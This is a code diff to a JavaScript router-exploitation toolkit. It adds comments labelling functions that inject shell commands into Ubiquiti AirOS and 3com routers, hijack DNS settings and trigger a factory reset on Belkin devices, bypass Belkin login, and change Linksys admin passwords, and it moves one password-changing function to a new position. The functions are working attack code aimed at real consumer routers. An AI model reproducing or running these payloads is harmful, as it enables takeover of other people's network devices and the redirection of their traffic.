@@ -1005,13 +1005,13 @@ function mt880fw() {
 	}
 }
 
+// Ubiquiti AirOS command execution
 function airoscmd() {
 	cmd=prompt("Command:");
 	if (cmd==null || cmd==""){}else{
 		document.location="http://192.168.1.1/stainfo.cgi?ifname=eth0;"+cmd;
 	}
 }
-
 function airoscmdr() {
 	ip=prompt("IP:");
 	cmd=prompt("Command:");
@@ -1020,7 +1020,7 @@ function airoscmdr() {
 	}
 }
 
-
+// 3com OfficeConnect command execution
 function comcommand() {
 	ip=prompt("IP:");
 	cmd=prompt("Command:");
@@ -1036,6 +1036,7 @@ function comcommandl() {
 	}
 }
 
+// Belkin F5D7632-4 6.01.04 change dns servers, F5D7230-4 change dns servers
 function belkindns() {
 	dns1=prompt("DNS IP (???.XXX.XXX.XXX):");
 	dns2=prompt("DNS IP ("+dns1+".???.XXX.XXX):");
@@ -1053,7 +1054,6 @@ function belkindns() {
 		document.belkindns.submit();
 	}
 }
-
 function belkindnsr() {
 	ip=prompt("IP:");
 	dns1=prompt("DNS IP (???.XXX.XXX.XXX):");
@@ -1074,6 +1074,7 @@ function belkindnsr() {
 	}
 }
 
+// Belkin F5D7230-4 factory reset
 function belkinrest() {
 	ip=prompt("IP:");
 	document.belkinrest.action="http://"+ip+"/cgi-bin/setup_dns.exe";
@@ -1082,6 +1083,7 @@ function belkinrest() {
 	}
 }
 
+// Belkin F9K1002 Authentication Bypass
 function tF() {
 	ip=prompt("IP:");
 	document.tF.action="http://"+ip+"/cgi-bin/login.exe";
@@ -1090,6 +1092,7 @@ function tF() {
 	}
 }
 
+// Linksys WRT54G change admin password
 function wrtadmin() {
 	admin=prompt("Change administrator password:");
 	document.wrtadmin.http_passwd.value=admin;
@@ -1098,6 +1101,17 @@ function wrtadmin() {
 		document.wrtadmin.submit();
 	}
 }
+function wrtadminr() {
+	ip=prompt("IP:");
+	document.wrtadmin.action="http://"+ip+"/manage.tri";
+	admin=prompt("Change administrator password:");
+	document.wrtadmin.http_passwd.value=admin;
+	document.wrtadmin.http_passwdConfirm.value=admin;
+	if (ip==null || ip==""){}else{
+		document.wrtadmin.submit();
+	}
+}
+
 // TP-Link WDR740ND/WDR740N - Directory Traversal
 function wdr740_dirtraversal(ip)
 {
@@ -1116,16 +1130,6 @@ function d615d3_commandexec(ip)
 	document.location="http://"+ip+url;
 }
 
-function wrtadminr() {
-	ip=prompt("IP:");
-	document.wrtadmin.action="http://"+ip+"/manage.tri";
-	admin=prompt("Change administrator password:");
-	document.wrtadmin.http_passwd.value=admin;
-	document.wrtadmin.http_passwdConfirm.value=admin;
-	if (ip==null || ip==""){}else{
-		document.wrtadmin.submit();
-	}
-}
 function wag120pass() {
 	admin=prompt("Change administrator password:");
 	document.wag120pass.sysPasswd.value=admin;
